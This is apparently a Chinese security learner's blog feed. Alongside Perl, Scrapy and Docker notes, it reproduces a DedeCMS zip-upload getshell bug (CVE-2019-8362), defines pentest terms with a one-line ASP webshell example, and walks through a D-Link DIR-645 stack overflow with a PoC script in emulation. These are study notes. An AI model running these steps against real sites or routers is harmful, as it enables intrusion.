        <content type="html"><![CDATA[<h2 id="Dedecms及体验数据下载安装"><a href="#Dedecms及体验数据下载安装" class="headerlink" title="Dedecms及体验数据下载安装"></a>Dedecms及体验数据下载安装</h2><h3 id="下载安装"><a href="#下载安装" class="headerlink" title="下载安装"></a>下载安装</h3><p>下载安装wamp</p><p>下载DedeCMS-V5.7-UTF8-SP2.tar.gz</p><p>解压放置在php默认目录中</p><p>访问/dedecms/install/index.php进行安装</p><p>有几个地方需要修改</p><p>/include/dedehttpdown.class.php 大约第507行</p><pre><code>$this-&gt;m_fp = @fsockopen($this-&gt;m_host, $this-&gt;m_port, $errno, $errstr,10);替换为：$this-&gt;m_fp = @stream_socket_client($this-&gt;m_host . &#39;:&#39; . $this-&gt;m_port, $errno, $errstr,10);</code></pre><p>下载织梦5.6版本的，把里面/dede/module_main.php 文件上传覆盖到网站空间对应的文件</p><h3 id="体验数据"><a href="#体验数据" class="headerlink" title="体验数据"></a>体验数据</h3><p>要使用体验数据，需要下载数据<a href="http://www.dedecms.com/demodata/dedev56demoutf8.zip">dedev56demoutf8.zip</a></p><p>登陆后台——模块管理——体验数据模块——下载安装</p><p>其中需要将dedev56demoutf8.xml改名为2928c22440da82958c3e749e3d5cddcd.xml</p><p>现在登陆首页可以看到体验数据，但栏目点进去仍然没有内容，需要在后台——生成——对所有内容进行更新。</p><h3 id="如何判断dedecms"><a href="#如何判断dedecms" class="headerlink" title="如何判断dedecms"></a>如何判断dedecms</h3><p>1.利用在线cms判别网站判别</p><p>2.访问robots.txt，返回</p><pre><code>User-agent: * Disallow: /plus/ad_js.phpDisallow: /plus/advancedsearch.phpDisallow: /plus/car.phpDisallow: /plus/carbuyaction.phpDisallow: /plus/shops_buyaction.phpDisallow: /plus/erraddsave.phpDisallow: /plus/posttocar.phpDisallow: /plus/disdls.phpDisallow: /plus/feedback_js.phpDisallow: /plus/mytag_js.phpDisallow: /plus/rss.phpDisallow: /plus/search.phpDisallow: /plus/recommend.phpDisallow: /plus/stow.phpDisallow: /plus/count.phpDisallow: /includeDisallow: /templets</code></pre><p>3.访问data/admin/ver.txt，返回版本更新日期</p><h2 id="dedecms后台getshell漏洞"><a href="#dedecms后台getshell漏洞" class="headerlink" title="dedecms后台getshell漏洞"></a>dedecms后台getshell漏洞</h2><p>漏洞参考 <a href="https://xz.aliyun.com/t/4150">https://xz.aliyun.com/t/4150</a></p><h3 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h3><p>CVE-2019-8362，提交时间 20190216</p><h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>上传zip文件解压缩对于文件名过滤不周，导致getshell</p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>首先构造一个文件名为1.jpg.php的文件，内容为<?php phpinfo();?></p><p>将该文件进行压缩为1.zip</p><p>登陆后台-核心-附件管理-文件式管理器处上传压缩文件到soft目录下</p><p>内容管理-图片集-添加文档（或访问dede/album_add.php），填写标题、主栏目，选择从ZIP压缩包中解压图片，压缩包文件选择我们上传的1.zip</p><p>发布，预览文档,点击图片链接可以看到phpinfo</p><p><a href="https://blog.szfszf.top/article/25/">Dedecms 最新版漏洞收集并复现学习</a></p>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透 </tag>
            
            <tag> CMS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>perl语言简要学习</title>
      <link href="2020/10/19/2020-10-19-perl_learn/"/>
      <url>2020/10/19/2020-10-19-perl_learn/</url>
      
        <content type="html"><![CDATA[<p>(1)perl -v</p><p>(2)perl -e ‘print “Hello World\n”‘</p><p>(3)hello.pl </p><pre><code>#!/usr/bin/perl# 输出 &quot;Hello, World&quot;print &quot;Hello, world\n&quot;;</code></pre><p>chmod 0755 hello.pl </p><p>./hello.pl </p><p>(4) 注释</p><pre><code># 单行=pod 注释这是一个多行注释这是一个多行注释这是一个多行注释这是一个多行注释=cut</code></pre><p>(5)双引号可以正常解析一些转义字符与变量，而单引号无法解析会原样输出。</p><p>单引号直接了当，引号内是什么就显示什么，双引号则需要考虑转义或变量替换等。</p><p>(6)数据类型 </p><p>标量 在使用时在变量的名字前面加上一个 $</p><pre><code>$myfirst=123;</code></pre><p>数组 数组变量以字符 @ 开头</p><pre><code>@arr=(1,2,3)</code></pre><p>哈希 哈希是一个无序的 key/value 对集合。可以使用键作为下标获取值。哈希变量以字符 % 开头。</p><pre><code>%h=(&#39;a&#39;=&gt;1,&#39;b&#39;=&gt;2); </code></pre><p>defined的用法</p><p>函数defined返回0、false或者非0、true。<br>此运算结果依赖于传递给它进行计算的参数的内容。<br>如果参数中不含有字符和数字值，则返回0；如果参数中包含一个字符或者数字值，则返回非0或者true值。<br>这对于判断一个已经建立的数组中的每个元素是否已经定义非常有用。</p><p>注意：此函数作用不是判断某个变量是否已经定义，而是用来判断某个变量是否为空。 </p>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> perl </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Scrapy数据库异步插入，出现数据重复和丢失</title>
      <link href="2020/10/19/2020-10-19-scrapy_deepcopy/"/>
      <url>2020/10/19/2020-10-19-scrapy_deepcopy/</url>
      
        <content type="html"><![CDATA[<p>原因:</p><p>由于Spider的速率比较快，而scapy操作数据库操作比较慢，导致pipeline中的方法调用较慢，这样当一个变量正在处理的时候，一个新的变量过来，之前的变量的值就会被覆盖，比如pipline的速率是1TPS，而spider的速率是5TPS，那么数据库应该会有5条重复数据。</p><p>解决方案:</p><p>对变量进行保存，在保存的变量进行操作，通过互斥确保变量不被修改</p><pre><code>#pipeline默认调用def process_item(self, item, spider):    #深拷贝    asynItem = copy.deepcopy(item)    d = self.dbpool.runInteraction(self._do_upinsert, asynItem, spider)</code></pre>]]></content>
      
      
      <categories>
          
          <category> 爬虫 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> scrapy </tag>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>crawlab docker搭建磁盘容量不足 处理方式</title>
      <link href="2020/10/13/2020-10-13-crawlab_no_space/"/>
      <url>2020/10/13/2020-10-13-crawlab_no_space/</url>
      
        <content type="html"><![CDATA[<p>1.执行命令 df -h ，可以看到主要是文件系统overlay容量不足。上网查解决办法， “docker overlay2占用大量磁盘空间处理方法”，主要是更换 docker root 磁盘 ，但最近采集要投入生产，不敢轻易尝试。选择其他方式清理空间出来。</p><pre><code>[root@localhost docker]# df -h文件系统                 容量  已用  可用 已用% 挂载点devtmpfs                 3.8G     0  3.8G    0% /devtmpfs                    3.8G     0  3.8G    0% /dev/shmtmpfs                    3.8G  385M  3.4G   11% /runtmpfs                    3.8G     0  3.8G    0% /sys/fs/cgroup/dev/mapper/centos-root   50G   50G  966M   99% //dev/sda2               1014M  192M  823M   19% /boot/dev/sda1                200M   12M  189M    6% /boot/efi/dev/mapper/centos-home  165G   48G  118G   29% /home/dev/sdb                 917G  2.3G  868G    1% /home/dataoverlay                   50G   50G  966M   99% /var/lib/docker/overlay2/1a7c1204c3dae877e11666b261d61120353e4eacd3c7a9f367c460a2c15d6ad0/mergedoverlay                   50G   50G  966M   99% /var/lib/docker/overlay2/cd41fcd13c9415f157e8a30c82b69e92b5290a3e909e838f9d9f883aef7b681d/mergedshm                       64M     0   64M    0% /var/lib/docker/containers/1f51eab9edaab5420a1e5bdf16bed152440a4905f1df72dcf18a2fcd3027f093/shmshm                       64M     0   64M    0% /var/lib/docker/containers/8ff88595b654395b906196ba5263455f5f299aefeeacc07dde6d7d5a5b4b855e/shmoverlay                   50G   50G  966M   99% /var/lib/docker/overlay2/c15aec78c59120668cc110d6f6dc8eca79dbd954f96d9b313ccf6c00a1b6a0c0/mergedoverlay                   50G   50G  966M   99% /var/lib/docker/overlay2/734e2393ffa4ef53b9c0c1012d8ae85ed5a8fcacf8fa1bbe22570fef4f30005b/mergedshm                       64M     0   64M    0% /var/lib/docker/containers/c692e3048cbf664dedc231db561f34334148c7a40d3a64248d0f995cb58d763f/shmshm                       64M     0   64M    0% /var/lib/docker/containers/6769978ff2fd429088c714363d0acce976afd11c877e34f1caec6c5102768739/shmtmpfs                    767M     0  767M    0% /run/user/0</code></pre><p>2.想办法清理/var/lib/docker/ </p><p>（1）清理容器日志</p><p>通常情况下与overlay2的同级目录下会有如下的目录：</p><pre><code>builder  containerd  containers  docker  dockerfile  image  lib  network  overlay2  plugins  runtimes  swarm  tmp  trust  volumes</code></pre><p>而往往占用大量空间的日志文件位于containers下，该目录下存在如下目录：</p><pre><code>[root@localhost containers]# ls1f51eab9edaab5420a1e5bdf16bed152440a4905f1df72dcf18a2fcd3027f093  8ff88595b654395b906196ba5263455f5f299aefeeacc07dde6d7d5a5b4b855e6769978ff2fd429088c714363d0acce976afd11c877e34f1caec6c5102768739  c692e3048cbf664dedc231db561f34334148c7a40d3a64248d0f995cb58d763f</code></pre><p>分别进入每个目录，在目录中会存在以目录名为前缀，以“-json.log”为后缀的日志文件，使用如下命令会看到文件的大小：</p><pre><code>ll -h</code></pre><p>然后可使用如下命令对该文件的内容进行清理：</p><pre><code>cat /dev/null &gt; *-json.log</code></pre><p>（2）通过命令du -h –max-depth=1 *，可以查看当前目录下各文件、文件夹的大小</p><pre><code>...0    trust0    volumes/ca580bcf081310d00743bc772753ef41e5dba90e462340429f9244d5e74316f3/_data0    volumes/ca580bcf081310d00743bc772753ef41e5dba90e462340429f9244d5e74316f3301M    volumes/1f2e9b1e704847ff762067e9d1793287c48f7e54491c6aa5830a457eba647947/_data/journal198M    volumes/1f2e9b1e704847ff762067e9d1793287c48f7e54491c6aa5830a457eba647947/_data/diagnostic.data42G    volumes/1f2e9b1e704847ff762067e9d1793287c48f7e54491c6aa5830a457eba647947/_data42G    volumes/1f2e9b1e704847ff762067e9d1793287c48f7e54491c6aa5830a457eba6479471.9M    volumes/f0b77c0e23008c747fb92bebfbd62ba7bbdbc6394dc30ab41a2c5113c173356b/_data1.9M    volumes/f0b77c0e23008c747fb92bebfbd62ba7bbdbc6394dc30ab41a2c5113c173356b42G    volumes</code></pre><p>发现主要是volumes文件夹占用空间，进入volumes/1f2e9b1e704847ff762067e9d1793287c48f7e54491c6aa5830a457eba647947/_data文件夹，主要是一些mongodb的wt数据</p><pre><code>[root@localhost _data]# ls -ll总用量 43295396-rw-------. 1 polkitd input     3600384 9月  28 21:26 collection-0-1546999572369944167.wt-rw-------. 1 polkitd input       20480 10月 15 02:12 collection-0--237472592091931255.wt-rw-------. 1 polkitd input  6186655744 10月 15 16:17 collection-13--237472592091931255.wt-rw-------. 1 polkitd input 19933765632 10月 15 16:17 collection-21--237472592091931255.wt-rw-------. 1 polkitd input       36864 10月 15 02:13 collection-2--237472592091931255.wt-rw-------. 1 polkitd input       36864 10月 15 14:26 collection-29--237472592091931255.wt-rw-------. 1 polkitd input       36864 10月 15 02:13 collection-31--237472592091931255.wt-rw-------. 1 polkitd input       20480 10月 15 02:13 collection-33--237472592091931255.wt-rw-------. 1 polkitd input       36864 10月 15 11:37 collection-35--237472592091931255.wt-rw-------. 1 polkitd input      958464 10月 15 11:37 collection-37--237472592091931255.wt-rw-------. 1 polkitd input       36864 10月 15 11:37 collection-39--237472592091931255.wt-rw-------. 1 polkitd input       36864 10月 15 16:13 collection-4--237472592091931255.wt-rw-------. 1 polkitd input       36864 10月 15 11:35 collection-44--237472592091931255.wt-rw-------. 1 polkitd input       36864 10月 15 14:25 collection-46--237472592091931255.wt-rw-------. 1 polkitd input      946176 10月 15 16:17 collection-48--237472592091931255.wt-rw-------. 1 polkitd input   569360384 10月 15 16:17 collection-50--237472592091931255.wt-rw-------. 1 polkitd input       36864 10月 15 02:13 collection-52--237472592091931255.wt-rw-------. 1 polkitd input       36864 10月 15 16:17 collection-8--237472592091931255.wtdrwx------. 2 polkitd input        4096 10月 15 16:17 diagnostic.data-rw-------. 1 polkitd input       36864 10月 15 02:13 index-10--237472592091931255.wt-rw-------. 1 polkitd input       20480 10月 15 02:12 index-1--237472592091931255.wt-rw-------. 1 polkitd input  1674801152 10月 15 16:17 index-14--237472592091931255.wt-rw-------. 1 polkitd input  1858211840 10月 15 16:17 index-15--237472592091931255.wt-rw-------. 1 polkitd input  4349509632 10月 15 16:17 index-17--237472592091931255.wt-rw-------. 1 polkitd input   736096256 10月 15 16:17 index-19--237472592091931255.wt-rw-------. 1 polkitd input  4403208192 10月 15 16:17 index-22--237472592091931255.wt-rw-------. 1 polkitd input  1825824768 10月 15 16:17 index-23--237472592091931255.wt-rw-------. 1 polkitd input  2772758528 10月 15 16:17 index-25--237472592091931255.wt-rw-------. 1 polkitd input       36864 10月 15 14:25 index-30--237472592091931255.wt-rw-------. 1 polkitd input       20480 10月 15 02:13 index-32--237472592091931255.wt-rw-------. 1 polkitd input       36864 10月 15 02:13 index-3--237472592091931255.wt-rw-------. 1 polkitd input       20480 10月 15 02:13 index-34--237472592091931255.wt-rw-------. 1 polkitd input       36864 10月 15 02:13 index-36--237472592091931255.wt-rw-------. 1 polkitd input       36864 10月 15 11:37 index-38--237472592091931255.wt-rw-------. 1 polkitd input       36864 10月 15 11:37 index-40--237472592091931255.wt-rw-------. 1 polkitd input       36864 10月 15 11:37 index-41--237472592091931255.wt-rw-------. 1 polkitd input       36864 10月 15 11:35 index-45--237472592091931255.wt-rw-------. 1 polkitd input       36864 10月 15 14:25 index-47--237472592091931255.wt-rw-------. 1 polkitd input      442368 10月 15 16:17 index-49--237472592091931255.wt-rw-------. 1 polkitd input    16117760 10月 15 16:17 index-51--237472592091931255.wt-rw-------. 1 polkitd input       36864 10月 15 16:08 index-5--237472592091931255.wt-rw-------. 1 polkitd input       36864 10月 15 02:13 index-53--237472592091931255.wt-rw-------. 1 polkitd input       36864 10月 15 16:13 index-6--237472592091931255.wtdrwx------. 2 polkitd input         110 10月 15 15:38 journal-rw-------. 1 polkitd input       36864 10月 15 02:12 _mdb_catalog.wt-rw-------. 1 polkitd input           2 10月 15 02:12 mongod.lock-rw-------. 1 polkitd input       36864 10月 15 16:17 sizeStorer.wt-rw-------. 1 polkitd input         114 7月  24 15:26 storage.bson-rw-------. 1 polkitd input          46 7月  24 15:26 WiredTiger-rw-------. 1 polkitd input        4096 10月 15 02:12 WiredTigerLAS.wt-rw-------. 1 polkitd input          21 7月  24 15:26 WiredTiger.lock-rw-------. 1 polkitd input        1271 10月 15 16:17 WiredTiger.turtle-rw-------. 1 polkitd input      184320 10月 15 16:17 WiredTiger.wt</code></pre><p>这些wt文件是MongoDB切换到WiredTiger存储引擎后，产生的二进制磁盘文件。（具体参考资料 <a href="https://mongoing.com/archives/74064%EF%BC%89">https://mongoing.com/archives/74064）</a></p><p>删除其中部分，发现仍能运行，以为不影响服务，结果停止服务重启后就不行了。</p><p>所以还是要更换 docker root 磁盘，重新搭建服务，深坑。</p><p>更改更大的磁盘方法：</p><p><a href="https://blog.csdn.net/qq805934132/article/details/83065064?utm_medium=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.channel_param&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.channel_param">https://blog.csdn.net/qq805934132/article/details/83065064?utm_medium=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.channel_param&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.channel_param</a></p><p>但按道理说docker只提供服务，不应该有那么大的数据存储，没搞懂，有大佬的话可以指点一下我吗？</p>]]></content>
      
      
      <categories>
          
          <category> docker </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>docker报错 no space left on device</title>
      <link href="2020/10/12/2020-10-12-docker_no_space/"/>
      <url>2020/10/12/2020-10-12-docker_no_space/</url>
      
        <content type="html"><![CDATA[<p>一、问题概述：</p><p>今日发现搭建的crawlab平台密码错误登陆不上，原因是其中的mongodb容器由于空间不够的原因未启动，在操作docker的时候发生了一个错误，这里记录一下解决的方法。</p><pre><code>[root@localhost data]# docker-compose up -ddata_redis_1 is up-to-dateStarting data_mongo_1 ... errorERROR: for data_mongo_1  Cannot start service mongo: mkdir /var/lib/docker/overlay2/cd41fcd13c9415f157e8a30c82b69e92b5290a3e909e838f9d9f883aef7b681d/merged: no space left on deviceERROR: for mongo  Cannot start service mongo: mkdir /var/lib/docker/overlay2/cd41fcd13c9415f157e8a30c82b69e92b5290a3e909e838f9d9f883aef7b681d/merged: no space left on deviceERROR: Encountered errors while bringing up the project.</code></pre><p>二、问题解释：</p><p>这里简单的翻译一下官方文档的介绍：</p><pre><code>The Docker daemon requires adequate space to write to /var/lib/docker before it can start/restart successfully. If the daemon is unable to start due to a &quot;No space left on device&quot; error, the following process can be used to remove large container log files to free disk space.</code></pre><p>在容器成功的启动或重启时docker的守护进程(daemon)需要充足的空间来写文件到/var/lib/docker中，如果守护进程因为没有剩余空间错误无法执行时，我们就需要移除大容器中的日志文件来释放硬盘空间。</p><p>解决方法：</p><pre><code>step1:首先需要对这个文件中的容器size进行排序，找出占比最大的容器；du -d1 -h /var/lib/docker/containers | sort -hstep 2：然后对文件进行写null处理，不需要删除日志文件；cat /dev/null &gt; /var/lib/docker/containers/container_id/container_log_name</code></pre>]]></content>
      
      
      <categories>
          
          <category> docker </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试学习1——阶段1</title>
      <link href="2020/10/12/2020-10-16-pentest_study_term/"/>
      <url>2020/10/12/2020-10-16-pentest_study_term/</url>
      
        <content type="html"><![CDATA[<h1 id="渗透测试相关术语"><a href="#渗透测试相关术语" class="headerlink" title="渗透测试相关术语"></a>渗透测试相关术语</h1><p>IP地址：Internet Protocal Address,互联网协议地址，又称为网际协议地址。一种统一的地址格式，为互联网上每一个网络和主机分配一个逻辑地址，可以理解为生活中的家庭地址。</p><p>VPS：Virtual Private Server，虚拟专用服务器技术，将一台服务器分割成多个虚拟虚拟专享服务器的优质服务。一般所说的VPS就是指一台虚拟出来的服务器，有外网IP，我们可以装好系统直接连接。</p><p>端口：port，设备与外界通讯交流的进出口。</p><p>一句话木马：代码长度很短的脚本木马，一般只有一行，跟平常一句话的长度差不多。例如asp的：  &lt;%excute(request(“value”))%&gt;</p><p>大马：指的是功能很多的脚本木马，一般都包含但不限于文件管理、命令执行、可读写目录查找。</p><p>webshell：指的是已经再某个web植入脚本木马，且该木马能被解析成脚本文件并能够访问到，能通过这个文件控制web。</p><p>URL：统一资源定位符，可以理解为链接。</p><p>提权：权限提升，就是提高自己的权限，提权都需要利用到漏洞。</p><p>POC：proof of concept，概念验证，可以是一段代码也可以是一个程序，用作验证某个漏洞的存在性，没有破坏能力。</p><p>EXP：exploit,指的是漏洞利用程序，这种程序可以是任何语言编写的，具有破坏能力。</p><p>payload:有效载荷，exploit利用成功后将执行payload。</p><p>shellcode:是一段用于利用软件漏洞而执行的代码，shellcode为16进制的机器码，因为经常让攻击者获得shell而得名。</p><p>CMS:内容管理系统，简单来说就是一种网站系统模板。</p><p>反序列化：将字节序列转换成目标对象的过程。</p><p>Fuzz测试：一种安全测试方法，介于完全的手工测试和完全的自动化测试之间。</p><h1 id="ip地址相关知识"><a href="#ip地址相关知识" class="headerlink" title="ip地址相关知识"></a>ip地址相关知识</h1><p>IP地址分类：根据网络号和主机号来分，分为A、B、C三类及特殊地址D、E，全0和全1都保留不用。</p><pre><code>A类：0.0.0.0-126.0.0.0 默认子网掩码：255.0.0.0，第一个字节为网络号，后面三个字节为主机号。B类：128.0.0.0-191.255.255.255 默认子网掩码：255.255.0.0，前两个字节为网络号，后面两个字节为主机号。C类：192.0.0.0-223.255.255.255 默认子网掩码：255.255.255.0，前三个字节为网络号，后面一个字节为主机号。D类：多播地址 224-239E类：保留地址 240-255</code></pre><p>在IP地址3种主要类型⾥，各保留了3个区域作为私有地址，其地址范围如下：</p><pre><code>A类地址：10.0.0.0～10.255.255.255B类地址：172.16.0.0～172.31.255.255C类地址：192.168.0.0～192.168.255.255回送地址：127.0.0.1 也是本机地址，等效于localhost或本机IP。</code></pre><p>A.B.C段</p><pre><code>C段 192.168.1.x 255.255.255.0B段 192.168.x.x 255.255.0.0A段 192.x.x.x 255.0.0</code></pre><h1 id="靶场"><a href="#靶场" class="headerlink" title="靶场"></a>靶场</h1><p>利用wamp php5搭建以下靶场</p><pre><code>dvwapikachudoraboxsqli-labsXSS-Labs http://langzi.fun/跨站脚本攻击-XSS-LEVEL-1.htupload-labs https://www.cnblogs.com/hack404/p/10385049.html</code></pre><p>web安全攻防演练网站 靶机 测试环境 收集</p><pre><code>http://demo.testfire.nethttp://testphp.vulnweb.comhttp://testasp.vulnweb.comhttp://testaspnet.vulnweb.comhttp://zero.webappsecurity.comhttp://crackme.cenzic.comhttp://www.webscantest.comhttp://scanme.nmap.org</code></pre><h1 id=""><a href="#" class="headerlink" title=""></a></h1>]]></content>
      
      
      <categories>
          
          <category> pentest </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pentest </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>D-Link DIR-645路由器栈溢出漏洞分析</title>
      <link href="2020/10/06/2020-10-06-D-Link_DIR-645/"/>
      <url>2020/10/06/2020-10-06-D-Link_DIR-645/</url>
      
        <content type="html"><![CDATA[<p>路由器固件模拟环境搭建(超详细)<br><a href="https://blog.csdn.net/wuyou1995/article/details/105545581">https://blog.csdn.net/wuyou1995/article/details/105545581</a></p><p>D-Link DIR-645路由器栈溢出漏洞分析q<br><a href="https://bbs.pediy.com/thread-259274.htm">https://bbs.pediy.com/thread-259274.htm</a></p><p>MIPS指令集</p><p>漏洞银行 hackshow 家用路由器漏洞挖掘入门</p><h1 id="D-Link-DIR-645路由器栈溢出漏洞分析"><a href="#D-Link-DIR-645路由器栈溢出漏洞分析" class="headerlink" title="D-Link DIR-645路由器栈溢出漏洞分析"></a>D-Link DIR-645路由器栈溢出漏洞分析</h1><h2 id="0x00-漏洞描述"><a href="#0x00-漏洞描述" class="headerlink" title="0x00 漏洞描述"></a>0x00 漏洞描述</h2><ul><li><p><a href="https://www.exploit-db.com/exploits/33862">https://www.exploit-db.com/exploits/33862</a></p><p>  This module exploits an remote buffer overflow vulnerability on several D-Link routers.The vulnerability exists in the handling of HTTP queries to the authentication.cgi with long password values. The vulnerability can be exploitable without authentication.This module has been tested successfully on D-Link firmware DIR645A1_FW103B11. Other firmwares such as the DIR865LA1_FW101b06 and DIR845LA1_FW100b20 are also vulnerable.</p></li><li><p>关键点：溢出漏洞、http请求、password字段、authentication.cgi</p></li></ul><h2 id="0x01-环境-工具"><a href="#0x01-环境-工具" class="headerlink" title="0x01 环境/工具"></a>0x01 环境/工具</h2><ul><li>Ubuntu 18.04：目标系统，运行路由器固件</li><li>Windows 7 专业版：运行IDA作为远程调试机</li><li>IDA Pro：静态分析、远程动态调试</li><li>mips rop finder插件：搜索可用rop</li><li>binwalk：提取固件中的文件系统</li><li>firmadyne工具包：模拟路由器执行</li><li>固件下载：<a href="ftp://ftp2.dlink.com/PRODUCTS/DIR-645/REVA/DIR-645_FIRMWARE_1.03.ZIP%EF%BC%8C%E8%A7%A3%E5%8E%8B%E5%BE%97%E5%88%B0dir645_FW_103.bin">ftp://ftp2.dlink.com/PRODUCTS/DIR-645/REVA/DIR-645_FIRMWARE_1.03.ZIP，解压得到dir645_FW_103.bin</a></li><li>《路由器0Day漏洞》一书中脚本：run_cgi.sh（poc）、patterLocOffset.py（确定偏移）、DIR645-f-V1.03.py（exp）</li></ul><h2 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h2><p>1.用binwalk将固件中的文件系统提取出来，cd到squashfs目录，寻找存在漏洞的目标文件authentication.cgi，得知其是一个符号链接，真正的目标文件是cgibin</p><pre><code>$ binwalk -Me dir645_FW_103.bin$ cd _dir645_FW_103.bin.extracted/$ cd squashfs-root/$ find ./ -name &quot;authen*&quot;./htdocs/web/authentication_logout.cgi./htdocs/web/authentication.cgi$ ll ./htdocs/web/authentication.cgilrwxrwxrwx 1 mamba mamba 14 Oct  5 22:16 ./htdocs/web/authentication.cgi -&gt; /htdocs/cgibin</code></pre><p>2.利用已有的poc来定位漏洞，使用的sh脚本如下，来自《路由器0Day漏洞》一书中run_cgi.sh，放在squashfs-root/目录下</p><pre><code>#!/bin/bash# 待执行命令# sudo ./run_cgi.sh `python -c &quot;print &#39;uid=A21G&amp;password=&#39;+&#39;A&#39;*1160&quot;` &quot;uid=A21G&quot;INPUT=&quot;$1&quot; # 参数1，uid=A21G&amp;password=1160个ATEST=&quot;$2&quot;    # 参数2，uid=A21GLEN=$(echo -n &quot;$INPUT&quot; | wc -c)    # 参数1的长度PORT=&quot;1234&quot;    # 监听的调试端口# 用法错误则提示if [ &quot;$LEN&quot; == &quot;0&quot; ] || [ &quot;$INPUT&quot; == &quot;-h&quot; ] || [ &quot;$UID&quot; != &quot;0&quot; ]then    echo -e &quot;\nUsage: sudo $0 \n&quot;    exit 1fi# 复制qemu-mipsel-static到本目录并重命名，注意是static版本cp $(which qemu-mipsel-static) ./qemuecho $TEST# ｜ 管道符：前者输出作为后者输入# chroot 将某目录设置为根目录（逻辑上的）echo &quot;$INPUT&quot; | chroot . ./qemu -E CONTENT_LENGTH=$LEN -E CONTENT_TYPE=&quot;application/x-www-form-urlencoded&quot; -E REQUEST_METHOD=&quot;POST&quot; -E REQUEST_URI=&quot;/authentication.cgi&quot; -E REMOTE_ADDR=&quot;192.168.1.1&quot; -g $PORT /htdocs/web/authentication.cgiecho &#39;run ok&#39;rm -f ./qemu    # 删除拷贝过来的执行文件</code></pre><p>3.书中原有的poc运行失败</p><pre><code>去掉2&gt;/dev/null，使其显示报错信息（2-标准报错信息chroot: failed to run command ‘./qemu’: No such file or directoryhttps://blog.csdn.net/xieqianhua55/article/details/50749489apt安装qemu-user-static，将cp中qemu-mipsel改为qemu-mipsel-static应该是因为chroot后，路径都变了，qemu的执行缺少依赖，改为静态即可</code></pre><p>4.Ubuntu中执行脚本，开启调试端口1234，等待远程调试机连接</p><pre><code>$ sudo ./run_cgi.sh `python -c &quot;print &#39;uid=A21G&amp;password=&#39;+&#39;A&#39;*1160&quot;` &quot;uid=A21G&quot;uid=A21G</code></pre><p>5.Windows 7 中IDA打开cgibin，Debugger菜单或F9选择开启远程调试 Remote GDB debugger，填写配置</p><pre><code>Application: /home/mamba/Downloads/_dir645_FW_103.bin.extracted/squashfs-root/htdocs/cgibinInput file: /home/mamba/Downloads/_dir645_FW_103.bin.extracted/squashfs-root/htdocs/cgibinParameters:Hostname: 192.168.24.163Port: 1234</code></pre><p>填写完后，点击ok连接远程调试。若步骤4中脚本开启，则ida会弹框</p><pre><code>There is already a process being debugged by remote. Do you want to attach to it?</code></pre><p>点击yes，进入ida动态调试。</p><p>ida远程调试</p><pre><code>sudo ./run_cgi.sh `python -c &quot;print &#39;uid=A21G&amp;password=&#39;+&#39;A&#39;*1160&quot;` &quot;uid=A21G&quot;sudo ./run_cgi.sh `python -c &quot;print &#39;uid=A21G&amp;password=&#39;+open(&#39;test&#39;,&#39;r&#39;).read(1160)&quot;` &quot;uid=A21G&quot;</code></pre>]]></content>
      
      
      <categories>
          
          <category> 环境配置 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ubuntu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>家用路由器漏洞挖掘入门</title>
      <link href="2020/09/18/2020-09-18-router_vuln/"/>
      <url>2020/09/18/2020-09-18-router_vuln/</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.bilibili.com/video/av69115025/?zw">https://www.bilibili.com/video/av69115025/?zw</a></p><ol><li><p>家用路由器安全研究的意义</p></li><li><p>家用路由器漏洞挖掘预备知识</p></li><li><p>家用路由器仿真环境搭建</p></li><li><p>家用路由器常见漏洞点</p></li><li><p>实战命令执行漏洞利用</p></li></ol><p>《揭秘家用路由器0day漏洞挖掘技术》</p><p>看雪2018峰会回顾_智能设备漏洞挖掘中几个突破点(内有十种固件提取方法和首次公开uboot提取固件方法)<br><a href="https://bbs.pediy.com/thread-230095.htm">https://bbs.pediy.com/thread-230095.htm</a></p>]]></content>
      
      
      <categories>
          
          <category> 环境配置 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ubuntu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>路由器漏洞分析环境搭建</title>
      <link href="2020/09/14/2020-09-14-router_env/"/>
      <url>2020/09/14/2020-09-14-router_env/</url>
      
